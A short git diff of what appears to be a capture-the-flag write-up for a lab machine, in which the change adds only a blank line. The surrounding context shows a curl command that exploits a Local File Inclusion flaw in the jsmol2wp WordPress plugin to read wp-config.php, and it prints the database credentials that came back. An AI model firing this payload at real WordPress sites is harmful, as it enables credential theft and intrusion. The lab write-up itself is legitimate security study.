@@ -55,6 +55,7 @@ Research on the `jsmol2wp` plugin revealed a known Local File Inclusion (LFI) vu
 curl -s "http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php"
 ```
 ![LFI on wp-config.php](img/lfi_wp-config.png)
+
 **Findings:** I successfully obtained the database credentials: `wpuser` / `kbLSF2Vop#lw3rjDZ629*Z%G`.
 
 **Analysis**: I identified a known Local File Inclusion (LFI) vulnerability in the JSmol2WP plugin.
